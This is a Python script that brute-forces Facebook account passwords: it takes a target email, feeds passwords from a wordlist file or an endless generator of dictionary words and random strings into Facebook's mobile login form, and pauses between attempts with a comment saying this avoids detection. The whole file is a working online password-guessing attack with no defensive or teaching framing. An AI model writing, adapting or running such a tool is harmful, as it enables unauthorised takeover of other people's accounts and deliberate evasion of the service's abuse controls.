import urllib3
import time
import random
import string
import nltk
import urllib.parse

# Initialize NLTK words corpus
nltk.download('words')
english_words = set(word.lower() for word in nltk.corpus.words.words())

# Global set to keep track of used passwords
used_passwords = set()

class FacebookLogin(object):
    def __init__(self, user, passw):
        self.user = user
        self.passw = passw
        self.http = urllib3.PoolManager()

    def login(self):
        params = urllib.parse.urlencode({'email': self.user, 'pass': self.passw})
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        # Now login
        print('Trying password:', self.passw)
        res = self.http.request('POST', "https://www.facebook.com/login.php?m=m&refsrc=http://m.facebook.com/home.php&refid=8", body=params.encode('utf-8'), headers=headers)
        if b"login" not in res.data:
            print("Login successful! Password:", self.passw)
            return True
        else:
            return False

    def logout(self):
        print('Logging out ' + self.user)
        self.http.request('GET', "http://m.facebook.com/logout.php?h=d439564b69cfc8f1cbca42beb7726b77&t=1314710986&refid=5&ref=mfl")

def main():
    fb_user = input('Enter your Facebook email: ')

    option = input('Select password generation method:\n'
                   '[1] Password list file\n'
                   '[2] Password generator\n'
                   'Enter your choice: ')

    if option == '1':
        file_path = input('Enter the path of passwords file: ')
        password_generator = load_passwords(file_path)
    elif option == '2':
        min_length = int(input('Enter the minimum length of passwords: '))
        max_length = int(input('Enter the maximum length of passwords: '))
        password_generator = generate_passwords(min_length, max_length)
    else:
        print('Invalid option. Exiting program.')
        return

    for password in password_generator:
        fblogin = FacebookLogin(fb_user, password)
        if fblogin.login():
            fblogin.logout()
            break
        time.sleep(2)  # Add a delay to avoid detection

def load_passwords(file_path):
    try:
        with open(file_path, 'r') as pass_file:
            return [password.strip() for password in pass_file.readlines()]
    except FileNotFoundError:
        print("Error: Passwords file not found.")
        return []

def generate_common_password():
    """Generate a common password from English words or phrases"""
    while True:
        word = random.choice(list(english_words))
        # Ensure the password is unique
        if word not in used_passwords:
            used_passwords.add(word)
            return word

def generate_strong_password(min_length, max_length):
    """Generate a strong password with a mix of characters"""
    chars = string.ascii_letters + string.digits + string.punctuation
    length = random.randint(min_length, max_length)
    return ''.join(random.choices(chars, k=length))

def generate_passwords(min_length, max_length):
    """Generate passwords alternating between common and strong passwords"""
    while True:
        yield generate_common_password()
        yield generate_strong_password(min_length, max_length)

if __name__ == '__main__':
    main()
